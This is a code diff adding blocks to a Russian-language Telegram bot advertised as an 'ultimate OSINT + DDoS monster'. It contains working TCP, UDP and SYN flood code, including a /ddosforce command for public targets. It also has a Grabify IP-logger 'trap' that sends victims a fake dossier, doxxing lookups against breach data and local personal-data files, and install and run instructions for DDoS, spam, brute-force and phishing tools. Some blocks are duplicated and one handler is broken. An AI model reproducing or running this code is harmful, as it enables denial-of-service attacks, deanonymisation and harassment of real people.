+            for url in phone_results[:5]:
+                reports.append(f"   • {url}")
+    elif '@' in target:
+        email_results = AutoSearch.search_email(target)
+        reports.append(f"✉️ EMAIL: {target}")
+        if email_results.get("gravatar"):
+            reports.append(f"🖼️ GRAVATAR: {email_results['gravatar']}")
+        if email_results.get("breaches"):
+            reports.append(f"💀 УТЕЧКИ: {len(email_results['breaches'])}")
+            for b in email_results["breaches"][:10]:
+                reports.append(f"   • {b}")
+        else:
+            reports.append("❌ Утечек не найдено")
+    else:
+        username_results = AutoSearch.search_username(target)
+        reports.append(f"👤 НИКНЕЙМ: @{target}")
+        if username_results:
+            for r in username_results[:20]:
+                reports.append(f"   • {r['platform']}: {r['url']}")
+        else:
+            reports.append("❌ Не найден ни на одной платформе")
+    
+    reports.append("\n" + "=" * 70)
+    
+    # ПОИСК В ТВОИХ БАЗАХ ДАННЫХ
+    reports.append("\n🔍 **ПОИСК В ТВОИХ БАЗАХ ДАННЫХ:**")
+    db_results = DatabaseSearcher.search(target)
+    db_report = DatabaseSearcher.format_report(target, db_results)
+    reports.append(db_report)
+    
+    full_report = "\n".join(reports)
+    
+    if len(full_report) > 4000:
+        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False, encoding='utf-8') as f:
+            f.write(full_report)
+            f.flush()
+            with open(f.name, 'rb') as doc:
+                bot.send_document(message.chat.id, doc, caption=f"📄 ДОСЬЕ НА {target}")
+            os.unlink(f.name)
+        bot.delete_message(message.chat.id, msg.message_id)
+    else:
+        bot.edit_message_text(full_report, message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['searchdb'])
+def searchdb_command(message):
+    """Поиск только в твоих базах"""
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "📁 /searchdb [номер/фио/почта]\n\nПример:\n/searchdb +79001234567\n/searchdb Иванов")
+        return
+    query = parts[1]
+    msg = bot.reply_to(message, f"🔍 ИЩУ В БАЗАХ: {query}")
+    results = DatabaseSearcher.search(query)
+    report = DatabaseSearcher.format_report(query, results)
+    bot.edit_message_text(report, message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['dblist'])
+def dblist_command(message):
+    """Список всех баз данных"""
+    files = DatabaseSearcher._find_all_databases()
+    if not files:
+        bot.reply_to(message, f"📁 Базы данных не найдены!\n\nСоздай папку '{DATABASE_FOLDER}' и положи туда файлы .xls, .csv, .json, .txt, .db")
+        return
+    text = f"📁 **НАЙДЕННЫЕ БАЗЫ ДАННЫХ ({len(files)} шт):**\n\n"
+    for f in files:
+        name = os.path.basename(f)
+        size = os.path.getsize(f) / 1024
+        text += f"• `{name}` — {size:.1f} KB\n"
+    text += f"\n💡 Команды:\n• `/dossier [запрос]` — поиск везде\n• `/searchdb [запрос]` — только в базах"
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+@bot.message_handler(commands=['face'])
+def face_help(message):
+    bot.reply_to(message, "🖼️ ОТПРАВЬ ФОТО С ПОДПИСЬЮ /face\n\nБот даст ссылки для поиска лица в Google, Яндекс, TinEye")
+
+
+@bot.message_handler(content_types=['photo'])
+def face_search_handler(message):
+    if not message.caption or not message.caption.startswith('/face'):
+        return
+    msg = bot.reply_to(message, "🖼️ АНАЛИЗИРУЮ ФОТО...")
+    file_id = message.photo[-1].file_id
+    file_info = bot.get_file(file_id)
+    file_url = f"https://api.telegram.org/file/bot{TOKEN}/{file_info.file_path}"
+    report = FaceSearchAPI.format_report(file_url)
+    bot.edit_message_text(report, message.chat.id, msg.message_id)
+
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК: УЛУЧШЕННЫЙ DDOS + UDP ФЛУД + GRABIFY (ИСПРАВЛЕННЫЙ)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+import socket
+import subprocess
+
+# ======================== 1. GRABIFY (ИСПРАВЛЕННЫЙ) ========================
+
+# ⚠️ ТВОЯ ПРАВИЛЬНАЯ ССЫЛКА (grabify, а не grabfy!)
+MY_GRABIFY_LINK = "https://grabify.link/OHUGRR"
+TRACKING_CODE = "8C8NZZ"
+
+def grabify_trap_fixed(target: str) -> str:
+    """Фейковое досье с правильной ссылкой grabify"""
+    return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                      🔥 ФЕЙКОВОЕ ДОСЬЕ (ЛОВУШКА) 🔥                                      │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  🎯 ЦЕЛЬ: {target} │
+│  📅 ДАТА: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} │
+│                                                                                                            │
+│  👤 НАЙДЕННЫЕ ДАННЫЕ:                                                                                      │
+│     • ФИО: ИВАНОВ ИВАН ИВАНОВИЧ                                                                           │
+│     • Адрес: г. МОСКВА, ул. ТВЕРСКАЯ, д. 1                                                                │
+│     • Телефон: +7 (999) 123-45-67                                                                         │
+│     • Паспорт: 4510 123456                                                                                │
+│                                                                                                            │
+│  🔓 ПОДТВЕРДИТЕ ЛИЧНОСТЬ:                                                                                  │
+│     👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇                                           │
+│     {MY_GRABIFY_LINK}                                                                                      │
+│     👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆                                           │
+│                                                                                                            │
+│  ⚠️ ССЫЛКА ДЕЙСТВИТЕЛЬНА 24 ЧАСА                                                                          │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+
+
+@bot.message_handler(commands=['trap'])
+def trap_fixed(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🎣 /trap [номер или ник]\n\nОтправляет жертве ФЕЙКОВОЕ досье\n\n📊 СМОТРЕТЬ IP: https://grabify.link/track/8C8NZZ")
+        return
+    
+    target = parts[1]
+    report = grabify_trap_fixed(target)
+    warning = "\n\n⚠️ ЭТО ФЕЙКОВОЕ ДОСЬЕ! Отправь его жертве.\n\n📊 ПОСЛЕ ПЕРЕХОДА — ПРОВЕРЯЙ IP:\nhttps://grabify.link/track/8C8NZZ"
+    bot.send_message(message.chat.id, report + warning)
+
+
+@bot.message_handler(commands=['trapinfo'])
+def trap_info_fixed(message):
+    info = f"""🎣 **СТАТУС ЛОВУШКИ GRABIFY (ИСПРАВЛЕННЫЙ)**
+
+🔗 ТВОЯ ССЫЛКА: `{MY_GRABIFY_LINK}`
+📊 TRACKING CODE: `{TRACKING_CODE}`
+🌐 СМОТРЕТЬ IP: https://grabify.link/track/{TRACKING_CODE}
+
+💡 **ИНСТРУКЦИЯ:**
+1. Отправь жертве /trap [цель]
+2. Жертва переходит по ссылке
+3. Ты видишь её IP, город, провайдера
+
+⚠️ Ссылка работает 24 часа"""
+    bot.send_message(message.chat.id, info, parse_mode="Markdown")
+
+
+# ======================== 2. УЛУЧШЕННЫЙ DDOS (TCP + UDP) ========================
+
+class AdvancedDDoS:
+    _running = False
+    _tcp_count = 0
+    _udp_count = 0
+    
+    @classmethod
+    def _tcp_worker(cls, target, port=80):
+        """TCP flood (HTTP/HTTPS)"""
+        while cls._running:
+            try:
+                requests.get(f"http://{target}", timeout=2, headers={"User-Agent": "Mozilla/5.0"})
+                cls._tcp_count += 1
+            except:
+                pass
+    
+    @classmethod
+    def _udp_worker(cls, target, port, packet_size=1024):
+        """UDP flood"""
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packet = b'\x00' * packet_size
+        while cls._running:
+            try:
+                sock.sendto(packet, (target, port))
+                cls._udp_count += 1
+            except:
+                pass
+        sock.close()
+    
+    @classmethod
+    def attack(cls, target, threads=50, duration=30, port=80, udp_ratio=0.3):
+        """
+        Комбинированная атака TCP + UDP
+        udp_ratio: доля UDP потоков (0.3 = 30% UDP, 70% TCP)
+        """
+        if not target.startswith('http'):
+            target = target
+        
+        cls._running = True
+        cls._tcp_count = 0
+        cls._udp_count = 0
+        
+        tcp_threads = int(threads * (1 - udp_ratio))
+        udp_threads = threads - tcp_threads
+        
+        workers = []
+        for _ in range(tcp_threads):
+            t = threading.Thread(target=cls._tcp_worker, args=(target, port))
+            t.daemon = True
+            t.start()
+            workers.append(t)
+        
+        for _ in range(udp_threads):
+            t = threading.Thread(target=cls._udp_worker, args=(target, port))
+            t.daemon = True
+            t.start()
+            workers.append(t)
+        
+        time.sleep(duration)
+        cls._running = False
+        
+        return {
+            "target": target,
+            "tcp_requests": cls._tcp_count,
+            "udp_packets": cls._udp_count,
+            "total": cls._tcp_count + cls._udp_count,
+            "duration": duration,
+            "threads": threads,
+            "port": port
+        }
+    
+    @classmethod
+    def format_report(cls, result):
+        return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                         💀 УЛУЧШЕННАЯ DDOS АТАКА ЗАВЕРШЕНА                                  │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  🎯 ЦЕЛЬ: {result['target']}:{result['port']} │
+│  🧵 ПОТОКОВ: {result['threads']} (TCP: {result['threads'] - int(result['threads']*0.3)}, UDP: {int(result['threads']*0.3)}) │
+│  ⏱️ ДЛИТЕЛЬНОСТЬ: {result['duration']} сек. │
+│  📊 TCP ЗАПРОСОВ: {result['tcp_requests']} │
+│  📦 UDP ПАКЕТОВ: {result['udp_packets']} │
+│  🔥 ВСЕГО: {result['total']} │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+
+
+@bot.message_handler(commands=['ddos'])
+def ddos_command_advanced(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "💀 /ddos [IP или ДОМЕН] [потоки] [секунды] [порт]\n\n/ddos 192.168.1.1 50 30 80\n/ddos example.com 100 60")
+        return
+    args = parts[1].split()
+    target = args[0]
+    threads = min(int(args[1]) if len(args) > 1 else 50, 200)
+    duration = min(int(args[2]) if len(args) > 2 else 30, 120)
+    port = int(args[3]) if len(args) > 3 else 80
+    
+    if not target.startswith("192.") and not target.startswith("10.") and target not in ["127.0.0.1", "localhost"]:
+        bot.reply_to(message, "⚠️ Атака только на локальные сети! Используйте /ddosforce для публичных целей.")
+        return
+    
+    msg = bot.reply_to(message, f"💀 УЛУЧШЕННАЯ АТАКА НА {target}:{port}\n🧵 {threads} потоков\n⏱️ {duration} сек\n\nАтака выполняется...")
+    result = AdvancedDDoS.attack(target, threads, duration, port)
+    bot.edit_message_text(AdvancedDDoS.format_report(result), message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['ddosforce'])
+def ddosforce_advanced(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "💀 /ddosforce [IP или ДОМЕН] [потоки] [секунды] [порт]\n\n⚠️ ВЫ ПОДТВЕРЖДАЕТЕ ПРАВО АТАКОВАТЬ ЭТУ ЦЕЛЬ!")
+        return
+    args = parts[1].split()
+    target = args[0]
+    threads = min(int(args[1]) if len(args) > 1 else 100, 500)
+    duration = min(int(args[2]) if len(args) > 2 else 60, 300)
+    port = int(args[3]) if len(args) > 3 else 80
+    
+    msg = bot.reply_to(message, f"💀 ФОРС-АТАКА НА {target}:{port}\n🧵 {threads} потоков\n⏱️ {duration} сек\n\nАтака выполняется...")
+    result = AdvancedDDoS.attack(target, threads, duration, port)
+    bot.edit_message_text(AdvancedDDoS.format_report(result), message.chat.id, msg.message_id)
+
+
+# ======================== 3. ПРОВЕРКА ЦЕЛИ (PING/CURL) ========================
+
+@bot.message_handler(commands=['ping'])
+def ping_target(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🏓 /ping [IP или ДОМЕН]\n\nПроверяет доступность цели")
+        return
+    target = parts[1]
+    msg = bot.reply_to(message, f"🏓 ПРОВЕРЯЮ {target}...")
+    
+    try:
+        result = subprocess.run(['ping', '-c', '3', target], capture_output=True, text=True, timeout=15)
+        if result.returncode == 0:
+            bot.edit_message_text(f"✅ {target} ДОСТУПЕН\n\n```\n{result.stdout[:500]}\n```", message.chat.id, msg.message_id, parse_mode="Markdown")
+        else:
+            bot.edit_message_text(f"❌ {target} НЕ ДОСТУПЕН\n\n```\n{result.stderr[:200]}\n```", message.chat.id, msg.message_id, parse_mode="Markdown")
+    except Exception as e:
+        bot.edit_message_text(f"❌ ОШИБКА: {e}", message.chat.id, msg.message_id)
+
+
+@bot.message_handler(commands=['httpcheck'])
+def http_check(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "🌐 /httpcheck [IP или ДОМЕН]\n\nПроверяет HTTP доступность цели")
+        return
+    target = parts[1]
+    if not target.startswith('http'):
+        target = f"http://{target}"
+    msg = bot.reply_to(message, f"🌐 ПРОВЕРЯЮ HTTP: {target}")
+    
+    try:
+        r = requests.get(target, timeout=10, headers={"User-Agent": "Mozilla/5.0"})
+        bot.edit_message_text(f"✅ {target} ОТВЕЧАЕТ\n📊 STATUS: {r.status_code}", message.chat.id, msg.message_id)
+    except Exception as e:
+        bot.edit_message_text(f"❌ {target} НЕ ОТВЕЧАЕТ\n⚠️ ОШИБКА: {str(e)[:100]}", message.chat.id, msg.message_id)
+
+
+# ======================== 4. STRESSERTELEGRAM (ИНСТРУКЦИЯ) ========================
+
+
+@bot.message_handler(commands=['stresser', 'стрессер'])
+def stresser_instruction(message):
+    text = "🔥 STRESSERTELEGRAM - СТРЕСС-ТЕСТ БОТОВ\n\n"
+    text += "УСТАНОВКА:\n"
+    text += "git clone https://github.com/CyberScoper/stressertelegram.git\n"
+    text += "cd stressertelegram\n"
+    text += "pip install telethon\n\n"
+    text += "ЗАПУСК:\n"
+    text += "python stresser.py\n\n"
+    text += "ТОЛЬКО ДЛЯ СВОИХ БОТОВ!"
+    bot.send_message(message.chat.id, text)
+
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+# БЛОК: DDOS + ОСИНТ + БРУТФОРС + СПАМЕРЫ + УСТАНОВЩИК (ВСЁ В ОДНОМ)
+# ═══════════════════════════════════════════════════════════════════════════════
+
+import socket
+import subprocess
+
+# ======================== 1. УЛУЧШЕННЫЙ DDOS ========================
+
+class AdvancedDDoS:
+    _running = False
+    _tcp_count = 0
+    _udp_count = 0
+    _syn_count = 0
+    
+    @classmethod
+    def _tcp_worker(cls, target, port=80):
+        while cls._running:
+            try:
+                requests.get(f"http://{target}", timeout=2, headers={"User-Agent": "Mozilla/5.0"})
+                cls._tcp_count += 1
+            except:
+                pass
+    
+    @classmethod
+    def _udp_worker(cls, target, port, packet_size=1024):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        packet = b'\x00' * packet_size
+        while cls._running:
+            try:
+                sock.sendto(packet, (target, port))
+                cls._udp_count += 1
+            except:
+                pass
+        sock.close()
+    
+    @classmethod
+    def _syn_worker(cls, target, port):
+        while cls._running:
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(0.1)
+                sock.connect((target, port))
+                cls._syn_count += 1
+                sock.close()
+            except:
+                pass
+    
+    @classmethod
+    def attack(cls, target, threads=50, duration=30, port=80, attack_type="all"):
+        if not target.startswith('http'):
+            target = target
+        cls._running = True
+        cls._tcp_count = 0
+        cls._udp_count = 0
+        cls._syn_count = 0
+        
+        workers = []
+        
+        if attack_type == "tcp":
+            for _ in range(threads):
+                t = threading.Thread(target=cls._tcp_worker, args=(target, port))
+                t.daemon = True
+                t.start()
+                workers.append(t)
+        elif attack_type == "udp":
+            for _ in range(threads):
+                t = threading.Thread(target=cls._udp_worker, args=(target, port))
+                t.daemon = True
+                t.start()
+                workers.append(t)
+        elif attack_type == "syn":
+            for _ in range(threads):
+                t = threading.Thread(target=cls._syn_worker, args=(target, port))
+                t.daemon = True
+                t.start()
+                workers.append(t)
+        else:
+            tcp_t = int(threads * 0.4)
+            udp_t = int(threads * 0.4)
+            syn_t = threads - tcp_t - udp_t
+            for _ in range(tcp_t):
+                t = threading.Thread(target=cls._tcp_worker, args=(target, port))
+                t.daemon = True
+                t.start()
+                workers.append(t)
+            for _ in range(udp_t):
+                t = threading.Thread(target=cls._udp_worker, args=(target, port))
+                t.daemon = True
+                t.start()
+                workers.append(t)
+            for _ in range(syn_t):
+                t = threading.Thread(target=cls._syn_worker, args=(target, port))
+                t.daemon = True
+                t.start()
+                workers.append(t)
+        
+        time.sleep(duration)
+        cls._running = False
+        
+        return {
+            "target": target,
+            "tcp_requests": cls._tcp_count,
+            "udp_packets": cls._udp_count,
+            "syn_requests": cls._syn_count,
+            "total": cls._tcp_count + cls._udp_count + cls._syn_count,
+            "duration": duration,
+            "threads": threads,
+            "port": port,
+            "attack_type": attack_type
+        }
+    
+    @classmethod
+    def format_report(cls, result):
+        return f"""┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                         💀 DDOS АТАКА ЗАВЕРШЕНА                                          │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  🎯 ЦЕЛЬ: {result['target']}:{result['port']} │
+│  🧵 ПОТОКОВ: {result['threads']} (Тип: {result['attack_type']}) │
+│  ⏱️ ДЛИТЕЛЬНОСТЬ: {result['duration']} сек. │
+│  📊 TCP ЗАПРОСОВ: {result['tcp_requests']} │
+│  📦 UDP ПАКЕТОВ: {result['udp_packets']} │
+│  🔥 SYN ЗАПРОСОВ: {result['syn_requests']} │
+│  💀 ВСЕГО: {result['total']} │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+
+
+@bot.message_handler(commands=['ddos'])
+def ddos_advanced(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "💀 /ddos [IP] [потоки] [секунды] [порт] [тип]\n\nТип: tcp, udp, syn, all\n/ddos 192.168.1.1 50 30 80 all")
+        return
+    args = parts[1].split()
+    target = args[0]
+    threads = min(int(args[1]) if len(args) > 1 else 50, 200)
+    duration = min(int(args[2]) if len(args) > 2 else 30, 120)
+    port = int(args[3]) if len(args) > 3 else 80
+    attack_type = args[4] if len(args) > 4 else "all"
+    msg = bot.reply_to(message, f"💀 АТАКА НА {target}:{port}\n🧵 {threads} потоков\n⏱️ {duration} сек\nТип: {attack_type}")
+    result = AdvancedDDoS.attack(target, threads, duration, port, attack_type)
+    bot.edit_message_text(AdvancedDDoS.format_report(result), message.chat.id, msg.message_id)
+
+
+# ======================== 2. УСТАНОВЩИК ВСЕХ ИНСТРУМЕНТОВ ========================
+
+@bot.message_handler(commands=['installtools'])
+def install_tools_command(message):
+    text = """🔥 **УСТАНОВКА ВСЕХ ИНСТРУМЕНТОВ** 🔥
+
+📦 **DDOS:**
+```
+
+git clone https://github.com/MatrixTM/MHDDoS
+git clone https://github.com/jseidl/GoldenEye
+
+```
+
+📞 **CALL-СПАМЕР:**
+```
+
+git clone https://github.com/pentestxr/Fludilka
+
+```
+
+🔍 **OSINT:**
+```
+
+pip install maigret
+git clone https://github.com/sherlock-project/sherlock
+git clone https://github.com/snooppr/snoop
+git clone https://github.com/theahmadov/vector
+git clone https://github.com/N0rz3/Eyes
+
+```
+
+💀 **БРУТФОРС/ФИШИНГ:**
+```
+
+git clone https://github.com/UltimateHackers/Blazy
+git clone https://github.com/richardsonjf/shellphish
+git clone https://github.com/jofpin/trape
+
+```
+
+💣 **СПАМЕРЫ:**
+```
+
+git clone https://github.com/noob-hackers/spamx
+git clone https://github.com/b31ngD3v/bomberthon
+
+```
+
+🛠️ **МУЛЬТИ-ТУЛЫ:**
+```
+
+git clone https://github.com/Ranginang67/DarkFly-Tool
+git clone https://github.com/cracker911181/Cracker-Tool
+
+```
+
+⚠️ **После установки перезапусти бота!**"""
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+# ======================== 3. ИНСТРУКЦИЯ ПО ЗАПУСКУ ========================
+
+@bot.message_handler(commands=['ddoshelp'])
+def ddos_help(message):
+    text = """💀 **DDOS ИНСТРУКЦИЯ** 💀
+
+**MHDDoS:**
+```bash
+cd MHDDoS
+python3 start.py get http://target.com 1000
+```
+
+GoldenEye:
+
+```bash
+cd GoldenEye
+python goldeneye.py http://target.com -w 50 -s 30
+```
+
+CALL-спамер (Fludilka):
+
+```bash
+cd Fludilka/termux
+python fludilka.py
+```
+
+Брутфорс Blazy:
+
+```bash
+cd Blazy
+python2 blazy.py
+```
+
+OSINT Snoop:
+
+```bash
+cd snoop
+python3 snoop.py username
+```
+
+Vector OSINT:
+
+```bash
+cd vector
+python vector.py username
+```
+
+DarkFly (500+ утилит):
+
+```bash
+cd DarkFly-Tool
+python2 install.py
+DarkFly
+```⚠️ ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ!"""
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+@bot.message_handler(commands=['ipinfo'])
+def nickname_search(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "/ipinfo IP")
+        bot.reply_to(message, "🔍 /snoop [никнейм]\n\nИщу...")
+        return
+    
+    username = parts[1].strip().replace('@', '')
+    msg = bot.reply_to(message, f"🔍 ИЩУ ПО НИКУ: @{username}")
+
+
+MY_GRABIFY_LINK = "https://grabify.link/OHUGRR"
+TRACKING_CODE = "8C8NZZ"
+
+def grabify_trap(target: str) -> str:
+   return f"""
+┌────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+│                                      🔥 ФЕЙКОВОЕ ДОСЬЕ (ЛОВУШКА) 🔥                                      │
+├────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+│  🎯 ЦЕЛЬ: {target} │
+│  📅 ДАТА: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} │
+│                                                                                                            │
+│  👤 НАЙДЕННЫЕ ДАННЫЕ:                                                                                      │
+│     • ФИО: ИВАНОВ ИВАН ИВАНОВИЧ                                                                           │
+│     • Адрес: г. МОСКВА, ул. ТВЕРСКАЯ, д. 1                                                                │
+│     • Телефон: +7 (999) 123-45-67                                                                         │
+│                                                                                                            │
+│  🔓 ПОДТВЕРДИТЕ ЛИЧНОСТЬ:                                                                                  │
+│     👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇👇                                           │
+│     {MY_GRABIFY_LINK}                                                                                      │
+│     👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆👆                                           │
+│                                                                                                            │
+│  ⚠️ ССЫЛКА ДЕЙСТВИТЕЛЬНА 24 ЧАСА                                                                          │
+└────────────────────────────────────────────────────────────────────────────────────────────────────────────┘"""
+
+
+
+@bot.message_handler(commands=['trap'])
+def trap_command(message):
+    parts = message.text.split(maxsplit=1)
+    if len(parts) < 2:
+        bot.reply_to(message, "⚠️ Использование: /trap [номер или ник]")
+        return
+
+    target = parts[1]
+    report = grabify_trap(target)
+    warning = "\n\n⚠️ ЭТО ФЕЙКОВОЕ ДОСЬЕ! Отправь его жертве.\n\n📊 ПОСЛЕ ПЕРЕХОДА — ПРОВЕРЯЙ IP: https://grabify.link/"
+    bot.send_message(message.chat.id, report + warning)
+
+
+@bot.message_handler(commands=['trapinfo'])
+def trap_info(message):
+    info = f"""🎣 СТАТУС ЛОВУШКИ GRABIFY
+
+🔗 ССЫЛКА: {MY_GRABIFY_LINK}
+📊 TRACKING CODE: {TRACKING_CODE}
+🌐 СМОТРЕТЬ IP: https://grabify.link/track/{TRACKING_CODE}
+
+💡 ИНСТРУКЦИЯ:
+
+1. Отправь жертве /trap
+2. Жертва переходит по ссылке
+3. Ты видишь её IP в Grabify"""
+    bot.send_message(message.chat.id, info, parse_mode="Markdown")
+
+
+
+@bot.message_handler(commands=['start', 'help'])
+def start_help_ultimate(message):
+    text = """🔥 ЛОРДЕК — ULTIMATE OSINT + DDOS МОНСТР 🔥
+
+📋 /dossier [ник/номер/почта] — АВТОМАТИЧЕСКОЕ ДОСЬЕ
+🐦 /blackbird [ник] — 700+ платформ
+👨‍👩‍👧‍👦 /relatives [фамилия имя] — поиск родственников
+🖼️ /face — отправь фото → поиск лица
+💀 /ddos [IP] [потоки] [сек] [порт] [tcp/udp/syn/all]
+💀 /ddoshelp — инструкция по DDoS инструментам
+🔍 /snoop [ник] — поиск по нику (50+ платформ)
+🌐 /ipinfo [IP] — информация по IP
+🎣 /trap [номер/ник] — фейковое досье (ловушка)
+🎣 /trapinfo — статус Grabify
+📦 /installtools — установка всех инструментов
+✉️ /emailhunt [почта] — поиск по email
+📁 /dblist — список твоих баз
+
+⚡ УСТАНОВЛЕННЫЕ ИНСТРУМЕНТЫ:
+• MHDDoS, GoldenEye — DDoS
+• Fludilka — CALL-спамер
+• Maigret, Sherlock, Snoop, Vector — OSINT
+• Blazy — брутфорс
+• ShellPhish, Trape — фишинг
+• DarkFly — 500+ утилит
+
+⚠️ ТОЛЬКО ДЛЯ ТЕСТИРОВАНИЯ!"""
+    bot.send_message(message.chat.id, text, parse_mode="Markdown")
+
+
+print("✅ ULTIMATE БЛОК ЗАГРУЖЕН")
+print("💀 DDOS: TCP + UDP + SYN")
+print("🔍 OSINT: Snoop, Vector, IPinfo")
+print("📦 УСТАНОВЩИК: /installtools")
+
+
+# ===============================================================================
+# ЗАПУСК БОТА
+# ===============================================================================
+
+if __name__ == "__main__":
+    print("=" * 60)
+    print("🔥 БОТ ЛОРДЕК — ULTIMATE OSINT-МОНСТР ЗАПУЩЕН 🔥")
+    print(f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
+    print(f"📁 ПАПКА С БАЗАМИ: {DATABASE_FOLDER}")
+    dbs = DatabaseSearcher._find_all_databases()
+    print(f"📊 НАЙДЕНО БАЗ ДАННЫХ: {len(dbs)}")
+    if dbs:
+        for db in dbs[:10]:
+            print(f"   • {os.path.basename(db)}")
+    print("=" * 60)
+    bot.infinity_polling()
